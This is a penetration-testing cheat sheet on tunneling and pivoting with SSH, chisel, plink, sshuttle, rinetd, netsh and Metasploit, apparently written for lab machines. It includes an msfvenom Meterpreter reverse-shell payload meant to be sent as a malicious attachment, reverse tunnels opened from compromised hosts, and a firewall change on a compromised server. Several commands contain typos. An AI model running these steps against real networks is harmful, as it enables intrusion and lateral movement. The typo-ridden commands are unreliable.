# Tunneling and Port Forwarding

## SSH

### Local Port Forwarding

Scenario: When getting a foothold on a target machine, you find a service running on it that is only listening on the local host, so you want to forward it to the Attack machine so you can access it.

```bash
# From Kali (Attack Machine)
# Syntax
ssh -L <local port>:<localhost>:<target port> -l <target user> <target IP>
# Example (from the Pandora machine on HTB)
ssh -L 8888:127.0.0.1:80 -l daniel 10.129.250.50
```

If we look at our local Kali host `http://127.0.0.1:8080` nothing is currently running there.

Now use SSH to connect to my target server on port 80, but access it on port 8080 locally.

```bash
# From Kali
ssh -f -nNT -L 8080:localhost:80 target_user@target_IP
ssh -f -nNT -L 8080:localhost:80 msfadmin@10.0.2.8
```

Should now be able to navigate to `http://127.0.0.1:8080` and see the target's web page.

We can use `lsof` to kill it: `lsof -i` and kill the PID of the process.

### Remote Port Forwarding

```bash
# From Target
sudo ssh -R 2222:localhost:22 kali@kali_IP
# From Kali
ssh target_IP -p 2222
```

```
Running HTTP through an SSH Tunnel
# From Target
sudo ssh -f -nNT -R 8080:localhost:80 msfadmin@10.0.2.8
# From Kali
# Can now navigate to 10.0.2.8 in a browser. Was not available prior.
```

### Dynamic Port Forwarding

```bash
# From Kali
ssh -f - N -D 9050 kali@intermediate_IP  # Dual homed with second IP of 10.1.1.7
proxychains ssh 10.1.1.5  # Target IP
```

## Chisel

### Socks Proxy

```bash
# From Kali
chisel server -p 8000 --reverse

# From Target - Download necessary platform binary i.e Linux adm64, Windows, etc.
./chisel client 10.50.143.31:8000 R:socks

# And now use proxychains with port 1080 (default)
```

### Port Forwarding

Scenario: When getting a foothold on a target machine, you find a service running on port 8000 that is only listening on the local host, so you want to forward it to the Attack machine (also to port 8000) so you can access it.

```bash
# From kali
chisel server -p 12312 --reverse

# From Target
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:8000:127.0.0.1:8000
```

## Plink

### Example

Pivoting through Windows based operating systems.

Scenario: From compromising a Windows server, we discover a mysqld.exe running on port 3306.

```powershell
# From a Windows System shell
# Transfer Plink.exe to this Windows system
plink.exe -ssh -l kali -pw kali -R <kali-machine:port>:<Windows-system:port> <kali-machine>
plink.exe -ssh -l kali -pw kali -R 100.11.0.4:1234:127.0.0.1:3306 10.11.0.4
# From Kali
sudo nmap -sV 127.0.0.1 -p 1234
```

## sshuttle

### Example

> Will only work if SSH is running and will NOT work on Windows machines

```bash
# From Kali
sshuttle -r USER@MACHINE_IP 0.0.0.0/0
```

## Armitage

### Example

```bash
# Setup Meterpreter revere shell
msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe LHOST=<IP> LPORT=<IP> -o winjan.exe
# From Armitage
# Add target host, select payload, windows, meterpreter, reverse_tcp, remove encoding, and update the port
# Now wait for a victim to click the malicious attachment winjan.exe
# Arimtage has detected and exploited it
# Right click on the target to select meterpreter, pivoting, setup, and see additional hosts
# We can now scan the new target(s). Select Hosts, MSFscans, and enter range
```

## Metasploit

### Example

```bash
msf > use exploit/multi/handler
msf > set payload windos/meterpreter/reverse_tcp
msf > set lhsot
msf > set lport
msf > exploit
# Now execute the winjan.exe file from the target like with Armitage
# We now have a meterpreter reverse shell and can check the network configuration
meterpreter > shell
C:\tools>ipconfig
exit
meterpreter > background
msf exploit(multi/handler) > use post/multi/manage/autoroute
msf post(multi/manage/autoroute) > set subnet 10.1.1.0
msf post(multi/manage/autoroute) > set session 1
msf post(multi/manage/autoroute) > exploit
# We can now pivot by scanning one of the new targets
msf auxiliary(scanner/ssh/ssh_version) > set rhosts 10.1.1.5
msf auxiliary(scanner/ssh/ssh_version) > exploit
```



## RINETD

### Example

During an assessment, we gained root access to an Internet-connected Linux web server. From there, we found and compromised a Linux client on an internal network, gaining access to SSH credentials.

```bash
# From Kali
# Test network connectivity
kali@kali:~$ ping google.com -c 1
PING google.com (216.58.207.142) 56(84) bytes of data.

# Test connection to found IP
kali@kali:~$ root@kali:~# nc -nvv 216.58.207.142 80
(UNKNOWN) [216.58.207.142] 80 (http) open
GET / HTTP/1.0
```

```bash
# Access compromised target via SSH
kali@kali:~# ssh student@10.11.0.128

# Test network connectivity -- no internet access
kali@kali:~$ ping google.com -c 1
(UNKNOWN) [216.58.207.142] 80 (http) : No route to host
```

```bash
# Redirect traffic to our Kali linux server using RINETD

ss -antp | grep "80"

# From Compromised target to Kali linux
student@debian:~$ nc -nvv 10.11.0.4 80
(UNKNOWN) [10.11.0.4] 80 (http) open
GET / HTTP/1.0
```

## NETSH

### Example

Scenario: Compromised a Windows target through remote vuln and obtain System privileges. We find an additional network interface. We identify a Windows Server that has port 445 open.

```powershell
# From Windows compromised target
netsh interface portproxy add v4tov4 listenport=<kali port> listenaddress=<kali IP> connectport=<Windows server port> <connectaddress=<Windows server address>
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
# Check for listening
netstat -anp TCP | find "4455"
# With admin permissions we can allo forwarding rule
netsh advfirewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action allow

# From Kali
smbclient -L 10.11.0.22 --port=4455 --user=Administrator
Data
# If an error occurs, we can test interaction
sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty /mnt/win10_share
ls -l /mnt/win10_share
```
